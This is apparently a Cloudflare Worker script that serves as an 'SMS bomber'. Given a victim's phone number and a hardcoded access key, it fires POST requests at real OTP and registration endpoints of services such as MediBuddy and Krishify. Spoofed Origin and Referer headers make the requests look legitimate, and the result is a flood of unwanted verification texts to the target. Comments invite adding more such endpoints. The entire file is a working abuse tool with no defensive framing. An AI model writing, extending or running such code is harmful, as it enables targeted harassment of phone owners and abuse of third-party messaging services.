addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  // Get query parameters
  const url = new URL(request.url)
  const number = url.searchParams.get('number')
  const countnumber = url.searchParams.get('countnumber')
  const key = url.searchParams.get('key')
  const validKey = "200233"

  // Random number generator
  function randomNumber(length) {
    let str = ""
    for (let i = 0; i < length; i++) {
      str += Math.floor(Math.random() * 10)
    }
    return str
  }

  // Name array
  const names = ['charan', 'raaghu', 'sumit', /* ... rest of your names ... */]
  const fname = names[Math.floor(Math.random() * names.length)]
  const imei = randomNumber(15)
  const user = randomNumber(21)

  // Key validation
  if (key !== validKey) {
    return new Response(JSON.stringify({ error: "Enter valid key" }), {
      status: 400,
      headers: { 'Content-Type': 'application/json' }
    })
  }

  // In Workers, we can't check file existence directly
  // You could use KV storage for banned numbers instead
  // For this example, we'll skip the ban check

  // Send bomb function using Fetch API
  async function sendBomb(url, data, headers) {
    try {
      await fetch(url, {
        method: 'POST',
        headers: headers,
        body: data
      })
    } catch (error) {
      console.error('Request failed:', error)
    }
  }

  // Define your API calls
  const requests = [
    {
      url: 'https://www.medibuddy.in/unified-login/user/register',
      data: JSON.stringify({ phonenumber: number }),
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Origin': 'https://www.medibuddy.in',
        'Referer': 'https://www.medibuddy.in/'
      }
    },
    {
      url: 'https://api.krishify.com/api/v1/auth/phone-login/generate',
      data: JSON.stringify({ phone_number: number, name: "Tetu Mama" }),
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Origin': 'https://deals.krishify.com',
        'Referer': 'https://deals.krishify.com/'
      }
    }
    // Add other API calls similarly...
  ]

  // Execute requests
  try {
    await Promise.all(requests.map(req => sendBomb(req.url, req.data, req.headers)))
    return new Response(JSON.stringify({ 
      message: `Successfully bombed ${countnumber}` 
    }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' }
    })
  } catch (error) {
    return new Response(JSON.stringify({ error: 'Bombing failed' }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    })
  }
}
